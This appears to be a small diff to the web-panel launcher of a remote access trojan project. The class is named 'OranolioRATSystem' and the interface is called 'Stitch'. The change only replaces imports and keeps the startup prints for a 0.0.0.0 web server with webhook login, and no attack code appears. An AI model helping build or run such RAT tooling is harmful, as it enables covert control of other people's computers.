@@ -166,10 +166,10 @@ print("[Web] Starting Stitch Web Interface...")
 from werkzeug.security import generate_password_hash
 
 # Monkey-patch for testing
-import web_app_real
+from main_entry import OranolioRATSystem
 # Legacy USERS dictionary removed - using webhook-based authentication
 
-from web_app_real import app, socketio
+from web_app import create_app
 
 print("[Web] Web interface starting on http://0.0.0.0:5000")
 print("[Web] Login: Use webhook authentication at /webhook-auth/login")
